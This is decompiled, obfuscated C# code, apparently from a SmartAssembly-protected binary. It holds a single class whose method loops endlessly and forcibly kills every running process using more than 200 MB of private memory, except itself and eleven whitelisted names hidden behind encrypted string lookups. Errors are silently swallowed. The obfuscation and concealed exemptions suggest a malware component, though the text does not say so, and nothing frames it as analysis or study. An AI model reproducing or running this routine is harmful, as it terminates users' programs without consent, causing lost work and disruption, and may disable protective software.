using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace igelRrgoft;

public static class EQdJghfEDGBOx
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void UQdYYSmbzjgKnaO()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107403446)) && !process.ProcessName.Contains(getString_0(107403917)) && !process.ProcessName.Contains(getString_0(107403940)) && !process.ProcessName.Contains(getString_0(107403931)) && !process.ProcessName.Contains(getString_0(107403886)) && !process.ProcessName.Contains(getString_0(107403905)) && !process.ProcessName.Contains(getString_0(107403860)) && !process.ProcessName.Contains(getString_0(107403847)) && !process.ProcessName.Contains(getString_0(107403866)) && !process.ProcessName.Contains(getString_0(107403821)) && !process.ProcessName.Contains(getString_0(107403832)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static EQdJghfEDGBOx()
	{
		Strings.CreateGetStringDelegate(typeof(EQdJghfEDGBOx));
	}
}
